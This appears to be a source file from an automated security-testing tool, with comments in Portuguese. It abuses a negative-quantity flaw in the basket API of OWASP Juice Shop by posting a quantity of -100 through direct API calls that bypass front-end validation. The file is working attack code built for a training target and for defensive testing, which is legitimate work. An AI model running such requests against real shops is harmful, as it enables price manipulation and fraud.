"use strict";
/**
 * executor/tasks/AbuseNegativeQuantity.ts
 * ---------------------------------------------------------------
 * Abuse Case: Quantidade Negativa no Carrinho
 *
 * Tenta adicionar um produto ao carrinho com quantidade negativa
 * via chamada direta à API, bypassando a validação do frontend
 * Angular (que só aceita inteiros positivos).
 *
 * Se o servidor aceitar, o total do carrinho pode ficar negativo,
 * efetivamente gerando um "crédito" ou permitindo compra gratuita.
 *
 * Juice Shop Challenge: "Manipulate basket items"
 * Categoria OWASP: OTG-BUSLOGIC-008
 * ---------------------------------------------------------------
 */
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.abuseNegativeQuantity = abuseNegativeQuantity;
const axios_1 = __importDefault(require("axios"));
async function abuseNegativeQuantity(jwt, baseUrl) {
    const headers = {
        'Authorization': `Bearer ${jwt}`,
        'Content-Type': 'application/json',
    };
    try {
        // Passo 1: obtém o ID do primeiro produto disponível
        const productsRes = await axios_1.default.get(`${baseUrl}/api/Products`, {
            headers,
            validateStatus: () => true,
            timeout: 10_000,
        });
        const productId = productsRes.data?.data?.[0]?.id ?? 1;
        // Passo 2: obtém o ID do carrinho do usuário atual
        const whoamiRes = await axios_1.default.get(`${baseUrl}/rest/user/whoami`, {
            headers,
            validateStatus: () => true,
            timeout: 10_000,
        });
        const userId = whoamiRes.data?.user?.id ?? 1;
        // Passo 3: tenta adicionar quantidade negativa
        const addRes = await axios_1.default.post(`${baseUrl}/api/BasketItems`, { ProductId: productId, BasketId: userId, quantity: -100 }, { headers, validateStatus: () => true, timeout: 10_000 });
        if (addRes.status === 200 || addRes.status === 201) {
            return {
                title: 'Manipulação de Quantidade Negativa no Carrinho',
                severity: 'HIGH',
                category: 'BLV_NEGATIVE_QUANTITY',
                description: 'A API aceita a adição de itens ao carrinho com quantidade negativa, ' +
                    'bypassando a validação implementada apenas no frontend Angular. ' +
                    'Isso pode resultar em totais negativos e compra sem custo.',
                steps: [
                    `GET ${baseUrl}/api/Products → ProductId=${productId}`,
                    `GET ${baseUrl}/rest/user/whoami → userId=${userId}`,
                    `POST ${baseUrl}/api/BasketItems com { ProductId: ${productId}, BasketId: ${userId}, quantity: -100 }`,
                    `Servidor respondeu HTTP ${addRes.status} — requisição aceita`,
                ],
                evidence: JSON.stringify(addRes.data).substring(0, 300),
                discoveredAt: new Date(),
            };
        }
        return null;
    }
    catch (err) {
        console.warn(`[Task] AbuseNegativeQuantity falhou: ${err.message}`);
        return null;
    }
}
//# sourceMappingURL=AbuseNegativeQuantity.js.map